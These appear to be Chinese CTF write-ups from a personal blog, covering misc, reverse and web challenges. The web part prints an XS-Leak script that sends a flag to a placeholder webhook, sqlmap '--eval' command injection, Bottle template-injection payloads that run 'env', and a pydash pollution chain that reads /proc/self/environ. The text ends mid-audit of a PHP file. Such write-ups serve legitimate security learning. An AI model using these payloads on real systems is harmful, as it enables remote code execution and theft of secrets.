扫码关注公众号，回复即可，主要这里的！要用中文的!!!\nlove.host binwalk分离然后打开压缩包即可，记得将sqctf改成大写\nez_music1 打开频谱图就可看到\nYuanShen_Start! 音频一放看到密码\n解压后将word转为压缩包，然后解压，在word-media找到图片\n010打开发现铭感数字\n随波逐流梭，然后解密发现是base58编码，然后继续梭，发现是栅栏加密，这是压缩包密码\nSQCTF{Yuan_Shen_Start!}\nreverse 慕然回首，那人却在灯火阑珊处 先反编译\nai梭哈了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 import sys from collections import deque # 逆向分析出的迷宫参数 MAZE_WIDTH = 10 MAZE_HEIGHT = 10 WALL_CHAR = 35 # ASCII \u0026#39;#\u0026#39; END_CHAR = 69 # ASCII \u0026#39;E\u0026#39; # 根据逆向代码推断的迷宫结构（需动态分析实际数据） maze = [ [35, 35, 35, 35, 35, 35, 35, 35, 35, 35], [35, 83, 32, 32, 35, 32, 32, 32, 32, 35], # S=起点(1,1) [35, 35, 35, 32, 35, 32, 35, 35, 32, 35], [35, 32, 32, 32, 35, 32, 32, 35, 32, 35], [35, 35, 35, 32, 35, 32, 35, 35, 32, 35], [35, 32, 32, 32, 32, 32, 35, 32, 32, 35], [35, 35, 35, 35, 35, 32, 35, 32, 35, 35], [35, 32, 32, 32, 32, 32, 32, 32, 32, 35], [35, 35, 35, 32, 35, 35, 35, 35, 32, 35], [35, 35, 35, 35, 35, 35, 35, 35, 69, 35] # E=终点(8,8) ] def find_path(): # BFS算法寻找最短路径（网页1/4/8方法综合） directions = {\u0026#39;w\u0026#39;: (-1, 0), \u0026#39;s\u0026#39;: (1, 0), \u0026#39;a\u0026#39;: (0, -1), \u0026#39;d\u0026#39;: (0, 1)} start = (1, 1) # 根据逆向代码推断的起始坐标 end = (8, 8) queue = deque() queue.append((start[0], start[1], \u0026#34;\u0026#34;)) visited = set() while queue: x, y, path = queue.popleft() # 到达终点（网页1的终止条件） if maze[x][y] == END_CHAR: return path # 遍历四个方向（网页8的逆时针顺序：右/下/左/上） for move in [\u0026#39;d\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;w\u0026#39;]: dx, dy = directions[move] nx, ny = x + dx, y + dy # 边界检查（根据逆向代码逻辑） if 0 \u0026lt;= nx \u0026lt; MAZE_HEIGHT and 0 \u0026lt;= ny \u0026lt; MAZE_WIDTH: # 碰撞检测（逆向代码中的35检查） if maze[nx][ny] != WALL_CHAR and (nx, ny) not in visited: visited.add((nx, ny)) queue.append((nx, ny, path + move)) return None # 生成flag（网页4的路径格式要求） if __name__ == \u0026#34;__main__\u0026#34;: path = find_path() if path: print(f\u0026#34;sqctf{{{path}}}\u0026#34;) # 符合逆向代码中flag格式要求 else: print(\u0026#34;No path found!\u0026#34;) 圣人当仁不让 还是照样反编译，然后将main还有vm_execute(将flag的每个字符异或0xAA再+3)喂给ai\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import base64 # 预定义的字符串 Str2 = \u0026#34;/P7sAe/U0s7c1vjb0vjfyt==\u0026#34; # 解码 Str2 decoded_Str2 = base64.b64decode(Str2) print(f\u0026#34;Decoded Str2: {decoded_Str2}\u0026#34;) # 逆向 vm_execute def reverse_vm_execute(input_bytes): result = bytearray(input_bytes) for i in range(len(result)): # 逆向操作：减 2，加 5，XOR 0xAA # 确保字节值在 0 到 255 之间 result[i] = (result[i] + 2) % 256 result[i] = (result[i] - 5) % 256 result[i] ^= 0xAA return bytes(result) # 找到正确的输入 correct_input = reverse_vm_execute(decoded_Str2) print(f\u0026#34;Correct input: {correct_input.decode()}\u0026#34;) flag是SQCTF{easy_re_vm}\nezRe 一样的python反编译\n解码的SQCTF{5ed2be45-2e83-48d2-b631-c088e51ee964}\n鹅鹅鹅，曲项向天歌 跟上面一样，这个代码直接给ai解密即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ciphertext = \u0026#39;itd~tzw_know_sanmenxbZ8\u0026#39; # 分段处理 part1_encrypted = ciphertext[:7] # 前7字符：itd~tzw part2_encrypted = ciphertext[7:20] # 中间13字符：_know_sanmenx part3_encrypted = ciphertext[20:] # 剩余1字符：8 # 逆向操作 part2_part1 = \u0026#39;\u0026#39;.join([chr(ord(c) - 5) for c in part1_encrypted]) part2_part2 = part2_encrypted # 保持原样 part2_part3 = \u0026#39;\u0026#39;.join([chr(ord(c) + 7) for c in part3_encrypted]) # 组合原始 part2 part2 = part2_part1 + part2_part2 + part2_part3 # 生成完整 flag true_flag = f\u0026#39;flag{{{part2}}}\u0026#39; print(true_flag) PWN 浅红欺醉粉，肯信有江梅 nc连接，然后cat /flag\n","date":"2025-04-07T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-sqctf/","title":"2025-sqctf"},{"content":" misc 27262524 拿到一个加密嵌套压缩包，直接爆破\n发现密码是272727，做misc多了，直接敏锐察觉接下来的密码就是文件名重复三次了，写一个脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 import os import pyzipper from queue import Queue def extract_zip(zip_path, output_dir): try: basename = os.path.basename(zip_path) filename = os.path.splitext(basename)[0] password = filename * 3 # 密码为文件名重复三次 with pyzipper.AESZipFile(zip_path) as zf: zf.extractall(path=output_dir, pwd=password.encode(\u0026#39;utf-8\u0026#39;)) print(f\u0026#34;[+] 解压成功: {zip_path}\u0026#34;) new_zips = [] for root, _, files in os.walk(output_dir): for file in files: if file.endswith(\u0026#34;.zip\u0026#34;): new_zips.append(os.path.join(root, file)) return new_zips except Exception as e: print(f\u0026#34;[-] 解压失败: {zip_path}, 错误: {str(e)}\u0026#34;) return [] # 其余代码与原始脚本相同 def main(): initial_zip = r\u0026#34;D:\\网安题文件\\27.zip\u0026#34; # 初始ZIP路径 output_dir = r\u0026#34;D:\\网安题文件\u0026#34; # 输出目录 # 确保输出目录存在 os.makedirs(output_dir, exist_ok=True) # 使用队列处理所有ZIP文件（广度优先遍历） processed = set() # 已处理文件集合（避免重复） queue = Queue() queue.put(initial_zip) while not queue.empty(): current_zip = queue.get() if current_zip in processed: continue processed.add(current_zip) # 解压并获取新生成的ZIP文件 new_zips = extract_zip(current_zip, output_dir) for zip_file in new_zips: queue.put(zip_file) print(\u0026#34;[*] 所有ZIP文件已处理完成！\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() 这里我遇到一个坑，一开始我直接解压显示错误，后面banzip解压可以，但是代码解压也不行，后面了解是加密算法有点坑\n这个加密算法是AES，而我代码一开始是用Python内置的zipfile模块，仅支持传统的 ZipCrypto 加密，后面换成 pyzipper模块就欧克。得到图片\nforemos提取了一张二维码\n直接微信扫码得到flag\nNSSCTF{The_competition_has_so_far_held_26_rounds}\n补充一句，这里的二维码其实反相了，按道理要用\nhttps://uutool.cn/img-color-reverse/\n这个网站恢复，然后再用QR扫，但是微信扫码比较强，直接出。\nJOJO 题目给了一张图片，随波一把梭没用\n丢进010看看\n发现这里把zip文件头50删了，那我们直接加上。然后binwalk分离，得到一个压缩包，里面有一张图片\n然后放随波逐流，发现还藏了压缩包，直接binwalk分离。然后发现是个加密压缩包，而且看起来像伪加密，但是其实不是。所以要找密码，爆破爆不出，那就是藏在哪里了。\n这张图片放随波逐流时发现crc不对\n想到可能宽高不对劲，用模板改一下宽高（快捷键Alt+4）\n高改成1800就可以看到密码：DarkWill（有些题可以到字符但是乱码，就要爆破宽了）\n解压是txt，里面是一大串字符，那不用想就是套娃\n一眼base16编码\n解码以后一眼凯撒加密，偏移量慢慢试，不想试可以取前面一小段放到随波梭哈看看偏移量\n解密后一样base64转图片（注意去掉前面的world），然后丢随波逐流，发现有zip，然后又分离得到一个压缩包\n一眼伪加密，09改成00后打开，flag就在里面\n总结：此题套娃，出题人接受拷打，难点：出题人防随波逐流，比如第一个要补全压缩包，要利用模板！第二个难点就是补全图片宽高，需要比较敏感。题目知识点不难，但是很难一下想到，还是要多用模板！下班。\n东北jail ","date":"2025-03-31T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-nss-round29-misc/","title":"2025-nss-round29-misc"},{"content":"web internal_api 打XSLeak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;script\u0026gt; function checkError(url) { // 定义函数，参数应为尝试的新flag（但被错误覆盖） url = \u0026#34;http://127.0.0.1:8000/internal/search?s=\u0026#34; + flag; // 🚨错误：覆盖传入的url参数，实际使用的flag始终是全局变量初始值 let script = document.createElement(\u0026#39;script\u0026#39;) // 创建\u0026lt;script\u0026gt;标签用于发起请求 let ret = false // 🚨未使用的变量 script.src = url // 设置脚本地址（实际为固定地址，无法测试新字符） script.onload = () =\u0026gt; { // 脚本加载成功时触发 fetch(\u0026#34;http://yourwebhook/?flag=\u0026#34; + flag) // 发送当前全局flag到攻击者服务器（但全局flag从未更新） } script.onerror = (e) =\u0026gt; {} // 加载失败不处理（未利用错误信息） document.head.appendChild(script) // 插入脚本以触发请求 } // 定义字符集和已知flag前缀 let charset = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789-}\u0026#39; // 猜测字符范围（包含闭合符}） let flag = \u0026#39;flag{\u0026#39; // Flag的通用开头（CTF常见格式） // 主爆破循环 for (let i = 0; i \u0026lt; charset.length; i++) { // 遍历字符集 let c = charset[i] // 获取当前尝试的字符 let newFlag = flag + c // 组合新flag（如flag{a） checkError(newFlag) // 🚨错误：传入参数未被函数使用，实际所有请求仍为flag{ } \u0026lt;/script\u0026gt; 每次运行爆出一位，然后手动在let flag = \u0026lsquo;flag{\u0026lsquo;后加上即可\n文章 - 浅谈XS-Leaks之Timeless timing attck - 先知社区\nsqlmap-master 先审计代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from fastapi import FastAPI, Request # 导入FastAPI框架及请求对象 from fastapi.responses import FileResponse, StreamingResponse # 导入文件响应和流式响应类 import subprocess # 用于执行系统命令 app = FastAPI() # 创建FastAPI应用实例 @app.get(\u0026#34;/\u0026#34;) # 定义根路径的GET路由 async def index(): return FileResponse(\u0026#34;index.html\u0026#34;) # 返回静态文件index.html（前端页面） @app.post(\u0026#34;/run\u0026#34;) # 定义/run路径的POST路由 async def run(request: Request): # 接收请求对象 data = await request.json() # 异步获取请求的JSON数据 url = data.get(\u0026#34;url\u0026#34;) # 从数据中提取url参数 if not url: # 校验url参数是否存在 return {\u0026#34;error\u0026#34;: \u0026#34;URL is required\u0026#34;} # 返回错误信息 # 构建sqlmap命令（存在安全风险！见下方警告） command = f\u0026#39;sqlmap -u {url} --batch --flush-session\u0026#39; # 直接拼接参数可能导致命令注入漏洞 def generate(): # 定义生成器函数用于流式输出 # 启动子进程执行命令 process = subprocess.Popen( command.split(), # 将命令按空格分割成列表（简单方式，复杂参数可能出错） stdout=subprocess.PIPE, # 捕获标准输出 stderr=subprocess.STDOUT, # 将错误输出合并到标准输出 shell=False # 禁用shell模式（安全最佳实践） ) while True: # 持续读取输出 output = process.stdout.readline() # 逐行读取输出 if output == \u0026#39;\u0026#39; and process.poll() is not None: # 判断进程是否结束 break if output: # 如果有输出内容 yield output # 生成输出内容 # 返回流式响应（实时显示扫描结果） return StreamingResponse(generate(), media_type=\u0026#34;text/plain\u0026#34;) 这里shell=flase,意味内容不会经过 Shell 的语法解析，全被当作参数看待，那就直接找找sqlmap有哪些可以执行命令或者读文件的参数\nsqlmap | GTFOBins\n通过 \u0026ndash;eval 参数可以执⾏ Python 代码, 注意因为上⾯ command.split() 默认是按空格分隔的（所以下面的=号可变空格），注意这⾥参数的值不需要加上单双引号, 因为上⾯已经设置了 shell=False , 如果加上去反⽽代表的是 \u0026ldquo;eval ⼀个 Python 字符串\u0026rdquo;，然后将payload改为紧凑型，避免使用分号。\n最终payload\n最后打127.0.0.1 --eval=__import__('os').system('env')//等号可以变空格\n用法 | sqlmap 用户手册\n翻了翻sqlmap手册，发现-c可以加载配置文件选项、\n所以也可以打\nhttps://localhost?id=1 -c /proc/self/environ //id=1没实际作用，测试时候写的，可以不加\nez_dash 审计代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 # 提示信息：Flag在环境变量中，这可能意味着代码中存在某种漏洞，可以通过漏洞获取环境变量中的Flag值。 from typing import Optional # 导入Optional类型，用于类型注解 import pydash # 导入pydash模块，用于操作对象属性 import bottle # 导入bottle框架，用于创建Web服务器 # 定义一个包含禁止访问的属性路径的列表，这些路径通常是Python对象的内部属性，防止用户通过这些路径篡改对象内部结构。 __forbidden_path__=[\u0026#39;__annotations__\u0026#39;, \u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__kwdefaults__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__qualname__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__wrapped__\u0026#39;, \u0026#34;Optional\u0026#34;, \u0026#34;func\u0026#34;, \u0026#34;render\u0026#34;] # 定义一个包含禁止访问的名称的列表，初始时包含\u0026#34;bottle\u0026#34;，防止用户直接操作bottle模块。 __forbidden_name__=[\u0026#34;bottle\u0026#34;] # 将内置模块中的所有属性名称添加到禁止访问的名称列表中，防止用户通过内置模块进行危险操作。 __forbidden_name__.extend(dir(globals()[\u0026#34;__builtins__\u0026#34;])) # 定义一个函数setval，用于设置指定对象的属性值。 def setval(name:str, path:str, value:str) -\u0026gt; Optional[bool]: # 如果名称中包含双下划线（__），直接返回False，防止用户访问Python的特殊方法或属性。 if name.find(\u0026#34;__\u0026#34;)\u0026gt;=0: return False # 遍历禁止访问的名称列表，如果名称在列表中，返回False。 for word in __forbidden_name__: if name==word: return False # 遍历禁止访问的路径列表，如果路径中包含列表中的内容，返回False。 for word in __forbidden_path__: if path.find(word)\u0026gt;=0: return False # 从全局变量中获取指定名称的对象。 obj=globals()[name] try: # 使用pydash模块的set_方法设置对象的属性值。 pydash.set_(obj, path, value) except: # 如果设置失败，返回False。 return False # 如果设置成功，返回True。 return True # 定义一个bottle的POST路由/setValue，用于接收用户请求并调用setval函数设置属性值。 @bottle.post(\u0026#39;/setValue\u0026#39;) def set_value(): # 从请求的查询参数中获取对象名称。 name = bottle.request.query.get(\u0026#39;name\u0026#39;) # 从请求的JSON数据中获取属性路径。 path = bottle.request.json.get(\u0026#39;path\u0026#39;) # 如果路径不是字符串，返回\u0026#34;no\u0026#34;。 if not isinstance(path, str): return \u0026#34;no\u0026#34; # 如果名称或路径长度超过限制，返回\u0026#34;no\u0026#34;。 if len(name) \u0026gt; 6 or len(path) \u0026gt; 32: return \u0026#34;no\u0026#34; # 从请求的JSON数据中获取属性值。 value = bottle.request.json.get(\u0026#39;value\u0026#39;) # 调用setval函数设置属性值，根据返回值返回\u0026#34;yes\u0026#34;或\u0026#34;no\u0026#34;。 return \u0026#34;yes\u0026#34; if setval(name, path, value) else \u0026#34;no\u0026#34; # 定义一个bottle的GET路由/render，用于渲染模板。 @bottle.get(\u0026#39;/render\u0026#39;) def render_template(): # 从请求的查询参数中获取模板路径。 path = bottle.request.query.get(\u0026#39;path\u0026#39;) # 如果路径中包含\u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;.\u0026#34;等字符，返回\u0026#34;Hacker\u0026#34;，防止用户通过模板注入攻击。 if path.find(\u0026#34;{\u0026#34;) \u0026gt;= 0 or path.find(\u0026#34;}\u0026#34;) \u0026gt;= 0 or path.find(\u0026#34;.\u0026#34;) \u0026gt;= 0: return \u0026#34;Hacker\u0026#34; # 使用bottle的template方法渲染模板并返回结果。 return bottle.template(path) # 启动bottle服务器，监听0.0.0.0的8000端口。 bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) 解法一 这里没过滤%，所以在rende路由可以执行python代码（类似打ssti）,paylaod\n原型是%eval(\u0026quot;__import__('os').popen('env')\u0026quot;)但是过滤了点号，所以用chr(46)代替，然后也不能出现空格，然后render只能渲染文件，不能渲染字符串，所以要将env输入到一个文件中，所以最终pyload是\n%eval(\u0026quot;__import__('os')\u0026quot;%2bchr(46)%2b\u0026quot;popen('env\u0026gt;1')\u0026quot;)\n解法二：打abort无回显 1 \u0026lt;%%20from%20bottle%20import%20abort%0afrom%20subprocess%20import%20getoutput%0aa=getoutput(\u0026#34;env\u0026#34;)%0aabort(404,a)%20%\u0026gt; 写成代码形式可能看得懂一点\n1 2 3 4 5 6 7 8 9 10 11 # 从bottle库中导入abort函数，用于发送HTTP错误响应 from bottle import abort # 从subprocess库中导入getoutput函数，用于执行系统命令并获取输出 from subprocess import getoutput # 执行系统命令\u0026#34;env\u0026#34;，该命令用于列出当前环境变量，并将输出存储在变量a中 a = getoutput(\u0026#34;env\u0026#34;) # 使用abort函数发送一个404 HTTP错误响应，并将环境变量的输出作为错误消息返回 abort(404, a) ez_dash_revenge 此题过滤了%，所以无法打上面得非预期（其实上面也是考原型污染链）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 from typing import Optional import pydash import bottle # 禁止访问的路径属性列表，主要是Python对象的特殊方法和属性 __forbidden_path__ = [\u0026#39;__annotations__\u0026#39;, \u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__kwdefaults__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__qualname__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__wrapped__\u0026#39;, \u0026#34;Optional\u0026#34;, \u0026#34;render\u0026#34; ] # 禁止访问的名称列表，包括bottle模块和内置对象 __forbidden_name__ = [\u0026#34;bottle\u0026#34;] __forbidden_name__.extend(dir(globals()[\u0026#34;__builtins__\u0026#34;])) # 设置变量值的函数 def setval(name: str, path: str, value: str) -\u0026gt; Optional[bool]: # 如果名称包含双下划线，返回False if name.find(\u0026#34;__\u0026#34;) \u0026gt;= 0: return False # 检查名称是否在禁止列表中 for word in __forbidden_name__: if name == word: return False # 检查路径是否包含禁止的属性 for word in __forbidden_path__: if path.find(word) \u0026gt;= 0: return False # 获取全局对象 obj = globals()[name] try: # 使用pydash.set_方法设置对象的属性值 pydash.set_(obj, path, value) except: # 如果设置失败，返回False return False # 设置成功，返回True return True # 处理POST请求的路由，用于设置变量值 @bottle.post(\u0026#39;/setValue\u0026#39;) def set_value(): # 获取请求中的name参数 name = bottle.request.query.get(\u0026#39;name\u0026#39;) # 获取请求中的path参数，必须是字符串类型 path = bottle.request.json.get(\u0026#39;path\u0026#39;) if not isinstance(path, str): return \u0026#34;no\u0026#34; # 检查name和path的长度是否超出限制 if len(name) \u0026gt; 6 or len(path) \u0026gt; 32: return \u0026#34;no\u0026#34; # 获取请求中的value参数 value = bottle.request.json.get(\u0026#39;value\u0026#39;) # 调用setval函数设置变量值，并根据结果返回yes或no return \u0026#34;yes\u0026#34; if setval(name, path, value) else \u0026#34;no\u0026#34; # 处理GET请求的路由，用于渲染模板 @bottle.get(\u0026#39;/render\u0026#39;) def render_template(): # 获取请求中的path参数 path = bottle.request.query.get(\u0026#39;path\u0026#39;) # 检查path长度是否超出限制 if len(path) \u0026gt; 10: return \u0026#34;hacker\u0026#34; # 定义黑名单字符，防止路径注入 blacklist = [\u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;.\u0026#34;, \u0026#34;%\u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026gt;\u0026#34;, \u0026#34;_\u0026#34;] # 检查path是否包含黑名单字符 for c in path: if c in blacklist: return \u0026#34;hacker\u0026#34; # 使用bottle.template渲染模板 return bottle.template(path) # 启动bottle应用，监听所有接口的8000端口 bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) 此题先看懂setval函数，这里面 pydash.set_(obj, path, value)很重要，其中name是我们要污染的对象，path是被污染的功能点路径，value是我们想让这个对象成为的值。\n再来看此题，由pydash知https://github.com/dgilland/pydash/blob/develop/src/pydash/helpers.py，path有一个bottle.TEMPLATE_PATH\u0026mdash;(指定模板文件所在的路径)，我们要污染他的路径，让他指向/proc/self/,然后再最后在 /render 路由下 GET 传参 path 为 environ ，对其进⾏渲染，就可以获取环境变量了，但是pydash限制不能随意更改bottle属性，接下来审计一下pydash源码，关键限制代码如下（截取了三段代码）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 def base_set(obj, key, value, allow_override=True): \u0026#34;\u0026#34;\u0026#34; Set an object\u0026#39;s `key` to `value`. If `obj` is a ``list`` and the `key` is the next available index position, append to list; otherwise, pad the list of ``None`` and then append to the list. Args: obj: Object to assign value to. key: Key or index to assign to. value: Value to assign. allow_override: Whether to allow overriding a previously set key. \u0026#34;\u0026#34;\u0026#34; # 如果obj是字典类型 if isinstance(obj, dict): # 如果允许覆盖或者key不在字典中 if allow_override or key not in obj: # 将key对应的值设置为value obj[key] = value # 如果obj是列表类型 elif isinstance(obj, list): # 将key转换为整数类型 key = int(key) # 如果key小于列表的长度 if key \u0026lt; len(obj): # 如果允许覆盖 if allow_override: # 将列表中key位置的值设置为value obj[key] = value else: # 如果key大于列表的长度 if key \u0026gt; len(obj): # 使用None填充列表，直到key的位置 obj[:] = (obj + [None] * key)[:key] # 在列表末尾追加value obj.append(value) # 如果obj是其他类型，并且允许覆盖或者该属性不存在，并且obj不是None elif (allow_override or not hasattr(obj, key)) and obj is not None: # 调用_raise_if_restricted_key函数检查是否是受限制的键 _raise_if_restricted_key(key) # 使用setattr函数设置obj的key属性为value setattr(obj, key, value) 1 RESTRICTED_KEYS = (\u0026#34;__globals__\u0026#34;, \u0026#34;__builtins__\u0026#34;) 1 2 3 4 def _raise_if_restricted_key(key): # Prevent access to restricted keys for security reasons. if key in RESTRICTED_KEYS: raise KeyError(f\u0026#34;access to restricted key {key!r} is not allowed\u0026#34;) 所以接下来思路明显了，先污染key函数为空，使我们可以用globals，然后再污染PATH，再渲染envrion即可\n用bp在/setValue抓包\n1 2 3 name=pydash#污染对象是pydash path:\u0026#34;helpers.RESTRICTED_KEYS\u0026#34; # 路径就是 helpers ⽂件中的 RESTRICTED_KEYS value:[]#修改成为的值就是空列表 1 2 3 name=setval # 污染对象是 setval path:\u0026#34;__globals__.bottle.TEMPLATE_PATH\u0026#34; # 路径是模板⽂件路径 value:[../../../../proc/self] # 修改为的值是存储环境变量⽂件路径，因为题⽬提示flag在环境变量中name=setval 深度解析：此paylaod寻找setval函数，将该函数往上查询____globals____.（__globals__ 是函数对象的一个属性，它会返回一个包含该函数全局命名空间的字典）,然后调用bottle框架中的TEMPLATE_PATH(指定模板文件所在的路径)，将路径设置为/proc/self/这样访问path时会自动跳转到这个路径下\n流程：\n1 2 3 4 5 { \u0026#34;path\u0026#34;:\u0026#34;helpers.RESTRICTED_KEYS\u0026#34;, \u0026#34;value\u0026#34;:[ ] } 注意type改成json\n1 2 3 4 { \u0026#34;path\u0026#34;:\u0026#34;__globals__.bottle.TEMPLATE_PATH\u0026#34;, \u0026#34;value\u0026#34;:[\u0026#34;/proc/self\u0026#34;] } ","date":"2025-03-26T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-nctf-web/","title":"2025-nctf-web"},{"content":" ccforum Seay审计一下代码\nadmin.php与config.php存在file_get_content函数，即存在文件读取漏洞，那么先审计admin.php\nadmin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 \u0026lt;?php // 引入配置文件，通常包含数据库连接信息等 require \u0026#39;config.php\u0026#39;; // 检查请求方法是否为POST，如果是，则处理登录逻辑 if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { // 获取POST请求中的用户名和密码，默认值为空字符串 $username = $_POST[\u0026#39;username\u0026#39;] ?? \u0026#39;\u0026#39;; $password = $_POST[\u0026#39;password\u0026#39;] ?? \u0026#39;\u0026#39;; try { // 准备SQL语句，查询admins表中用户名匹配的记录 $stmt = $pdo-\u0026gt;prepare(\u0026#34;SELECT * FROM admins WHERE username = ?\u0026#34;); // 执行查询，传入用户名作为参数 $stmt-\u0026gt;execute([$username]); // 获取查询结果 $admin = $stmt-\u0026gt;fetch(); // 如果查询到管理员且密码验证通过 if ($admin \u0026amp;\u0026amp; password_verify($password, $admin[\u0026#39;password\u0026#39;])) { // 设置会话变量，标识管理员登录状态 $_SESSION[\u0026#39;admin_id\u0026#39;] = $admin[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;admin_username\u0026#39;] = $admin[\u0026#39;username\u0026#39;]; $_SESSION[\u0026#39;admin\u0026#39;] = true; // 记录登录成功的操作日志 log_action($username, \u0026#39;admin_login\u0026#39;, 1); // 重定向到管理员页面 header(\u0026#34;Location: admin.php\u0026#34;); // 终止脚本执行 exit(); } else { // 记录登录失败的操作日志 log_action($username, \u0026#39;admin_login\u0026#39;, 0, \u0026#39;Invalid credentials\u0026#39;); // 输出错误信息并终止脚本 die(\u0026#34;Invalid credentials\u0026#34;); } } catch (PDOException $e) { // 捕获数据库操作异常，记录错误日志 log_action($username, \u0026#39;admin_login\u0026#39;, 0, $e-\u0026gt;getMessage()); // 输出错误信息并终止脚本 die(\u0026#34;Admin login failed: \u0026#34; . $e-\u0026gt;getMessage()); } } // 检查会话中是否没有管理员登录状态，如果是，则拒绝访问 if (!isset($_SESSION[\u0026#39;admin\u0026#39;]) || !$_SESSION[\u0026#39;admin\u0026#39;]) { die(\u0026#34;Access denied. Please login as admin.\u0026#34;); } // 定义操作日志文件路径 $action_log_path = \u0026#39;/var/www/action.log\u0026#39;; // 检查操作日志文件是否存在，如果不存在，则输出错误信息并终止脚本 if (!file_exists($action_log_path)) { die(\u0026#34;Action log file not found.\u0026#34;); } // 读取操作日志文件内容 $action_log = file_get_contents($action_log_path); // 将日志内容按行分割成数组 $log_lines = explode(\u0026#34;\\n\u0026#34;, $action_log); // 初始化被封禁用户和失败日志数组 $banned_users = []; $failed_logs = []; // 遍历每一行日志 foreach ($log_lines as $line) { // 如果行为空，跳过 if (empty($line)) { continue; } // 按逗号分割日志行 $parts = explode(\u0026#39;,\u0026#39;, $line); // 如果分割后的部分数量不足5个，跳过 if (count($parts) \u0026lt; 5) { continue; } // 获取编码后的用户名、操作类型、成功状态和附加信息 $encoded_user = $parts[1]; $action = $parts[2]; $success = (int) $parts[3]; $additional_info = $parts[4]; 